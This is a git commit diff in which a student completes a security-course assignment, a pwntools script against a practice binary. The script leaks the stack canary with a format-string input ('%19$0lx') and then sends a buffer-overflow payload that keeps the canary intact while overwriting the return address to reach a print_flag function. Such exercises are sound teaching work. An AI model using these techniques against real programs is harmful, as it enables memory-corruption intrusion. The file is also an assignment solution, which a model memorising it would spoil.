0e6154e04a595332f812aa9cf0ae4151a9b678c3
Ethan Cheng <ethan@nijika.org>
2025-11-07 23:26:57 -0800

    complete part 3 and report

--- assignment-2/3-killing-the-canary/part3.py
+++ assignment-2/3-killing-the-canary/part3.py
@@ -8,17 +8,34 @@ r = process([exe.path])
 # gdb.attach(r)
 
 r.recvuntil(b"What's your name? ")
-r.sendline(b"xxx") #Add your code here
+r.sendline(b"%19$0lx") #Add your code here
 
 val = r.recvuntil(b"What's your message? ")
 # log.info(val)
-canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
-log.info(f"Canary: {canary:x}")
+canary = re.match(b"Hello, ([0-9a-f]+)\n!.*", val).groups()[0]
+log.info(f"Canary: {canary}")
 
 win = exe.symbols['print_flag']
 # log.info(hex(win))
 
-payload = # Add your payload here
+
+payload = b"" # Add your payload here
+
+# buffer overflow
+for i in range(72):
+    payload += b"\x00"
+
+# canary (little endian)
+for i in range(8):
+    payload += bytes.fromhex(canary[14-2*i:16-2*i].decode())
+
+# saved rbp
+for i in range(8):
+    payload += b"\x00"
+
+# return address (little endian)
+payload += b"\x36\x12\x40\x00\x00\x00\x00\x00"
+
 r.sendline(payload)
 
 r.recvline()
